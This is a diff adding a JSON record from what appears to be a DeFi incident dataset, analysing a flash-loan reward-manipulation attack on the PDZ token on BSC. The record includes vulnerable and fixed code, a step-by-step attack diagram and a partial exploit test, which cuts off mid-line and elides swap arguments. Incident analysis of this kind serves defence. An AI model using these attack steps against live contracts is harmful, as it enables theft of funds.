@@ -1,0 +1,30 @@
+{
+ "id": "2025__2025-08-08_PDZ_FlashLoan-RewardManipulation",
+ "source_file": "2025/2025-08-08_PDZ_FlashLoan-RewardManipulation.md",
+ "title": "PDZ — Flash Loan-Based Reward Manipulation Analysis",
+ "date": "2025-08-08",
+ "protocol": "PDZ",
+ "chain": "BSC",
+ "loss_raw": "~3.3 BNB",
+ "loss_usd": null,
+ "root_cause": "BNB reward calculation in `burnToHolder` relies on manipulable PancakeSwap pair reserves",
+ "attack_tx": "0x81fd00ea...",
+ "vulnerable_contract": "0x664201579057f50D23820d20558f4b61bd80BDda",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: reward calculation based on spot balance\nfunction burnToHolder(uint256 amount, address _invitation) external {\n    // Burns PDZ tokens and pays BNB reward\n    // Uses current pair reserve for reward calculation → manipulable\n    uint256 bnbReward = calculateReward(amount, pair.reserve0(), pair.reserve1());\n    _burn(msg.sender, amount);\n    payable(msg.sender).transfer(bnbReward);\n}\n\n//",
+  "// File: PDZ_decompiled.sol\ncontract PDZ {\n    function burnToHolder(uint256 a, address b) external {  // ❌ Vulnerability\n        // TODO: decompiled logic not yet implemented\n    }"
+ ],
+ "code_after": [
+  "✅ Recommended fix: use TWAP or fixed rate\nfunction burnToHolder(uint256 amount, address _invitation) external {\n    uint256 bnbReward = amount * FIXED_RATE / 1e18; // tamper-proof fixed rate\n    _burn(msg.sender, amount);\n    payable(msg.sender).transfer(bnbReward);\n}"
+ ],
+ "steps": [
+  "[2] ▶ Swap WBNB → PDZ (drive up PDZ price)"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─▶ PancakeSwap flash swap (borrow 10 WBNB)\n  │\n  ├─[2]─▶ Swap WBNB → PDZ (drive up PDZ price)\n  │         └─ Pool PDZ reserve decreases, BNB reserve increases\n  │\n  ├─[3]─▶ Call TbBuild.burnToHolder(PDZ)\n  │         └─ Collect inflated BNB reward based on manipulated reserves\n  │\n  ├─[4]─▶ Collect additional rewards via TbBuild.receiveRewards()\n  │\n  ├─[5]─▶ Swap PDZ back to WBNB\n  │\n  └─[6]─▶ Repay flash swap + retain profit\n              └─ ~3.3 BNB profit",
+  "function testExploit() public balanceLog {\n    // [1] Borrow 10 WBNB via PancakeSwap flash swap\n    IPancakePair(PANCAKE_PAIR).swap(10 ether, 0, address(this), hex\"00\");\n}\n\nfunction pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes memory _data) public {\n    IERC20 wbnb = IERC20(WBNB_ADDR);\n    IERC20 pdz = IERC20(PDZ_TOKEN);\n    IPancakeRouter router = IPancakeRouter(payable(PANCAKE_ROUTER));\n\n    // [2] Buy large amount of PDZ with borrowed WBNB → manipulate pool reserves\n    address[] memory path = new address[](2);\n    path[0] = WBNB_ADDR;\n    path[1] = PDZ_TOKEN;\n    wbnb.approve(address(router), type(uint256).max);\n    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(...);\n\n    // [3] Call burnToHolder at manipulated price → receive excess BNB\n    pdz"
+ ]
+}
